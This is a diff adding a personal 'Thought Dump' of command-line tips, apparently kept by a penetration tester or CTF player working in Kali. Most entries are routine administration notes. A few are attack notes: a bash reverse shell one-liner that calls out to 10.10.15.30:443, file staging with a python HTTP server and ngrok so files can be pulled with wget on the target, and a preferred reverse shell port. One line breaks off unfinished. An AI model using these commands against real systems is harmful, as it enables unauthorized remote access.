@@ -1,0 +1,34 @@
+# Thought Dump
+
+- If docker breaks: `sudo mkdir /sys/fs/cgroup/systemd`
+- Remove guest user on Windows 10: `net user guest /active:no`
+- Command to pop a reverse shell: `/bin/bash -c "bash -i >& /dev/tcp/10.10.15.30/443 0>&1"`
+- Generate ssh key for remote authentication without a password: `ssh-keygen -t rsa -b 4096`
+- Command to run a simple http server with the scope of the current directory: `python -m http.server 80`, **PRIMARY METHOD OF PULLING FILES WITH WGET ON THE TARGET (combined with ngrok)**
+- Screenshot to clipboard on Windows 10 with the hotkey: `Windows+shift+s`
+- When attempting to spawn a shell on a foreign platform, look up "how to run commands on (Insert Platform)"
+- Decrypt TLS: https://www.comparitech.com/net-admin/decrypt-ssl-with-wireshark/
+- Update Kali Linux: `sudo apt update && sudo apt full-upgrade -y && sudo apt autoremove`
+	- `&&` specifies so that the second command will only execute if the first one executes successfully
+- Disable screen saver on kali by searching: `Setting -> Power Manager -> Security` and disabling it
+- If upgrade fails in Kali Linux, change `/etc/apt/sources.list` from http to https (this will prevent antivirus from catching it on the host)
+- If copy/paste stops working in VMware, run: `sudo restart-vm-tools`
+- If crackmapexec does not work the first time running, run: `sudo crackmapexec`
+- Mount an smb folder with the command: `sudo mount -t cifs \\\\<Target IP>\\<Target Path> <Destination Path>`
+- Remove PEM password with command: `openssl rsa -in <Original Key> -out <New Key>`
+- Change group with the command: `chgrp`
+- Change text to base64 with the following command: `echo '<Original Text>' | base64 -w 0`
+- Update apt key if located in `/etc/apt/trusted.gpg`: `sudo cp /etc/apt/trusted.gpg /etc/apt/trusted.gpg.d`
+- Check public IP from CLI: `curl ifconfig.co`
+- Find hidden subdomains through certificate transparency logs with https://crt.sh and search for `%.<Target Domain>`
+- Learn DNS: https://www.cloudflare.com/learning/dns/dns-server-types/
+- Update local database: `sudo updatedb`
+- Apt repository sources are located in `/etc/apt/sources.list` and `/etc/apt/sources.list.d/`
+- Clear terminal with `ctrl+l`
+- Use port `9001` for reverse shell for consistency
+- `\` is an escape character, `\\` in a string in code generally refers to just `\`
+- Start PowerShell in Kali with `pwsh`
+- Test command execution by setting up a simple 
+- `dumpbin` is a windows program you can use to check dependencies (DLLs) with `/imports` flag
+- Create a sequential ID wordlist with
+	- `for i in $(seq 1 1000); do echo $i >> ids.txt; done`
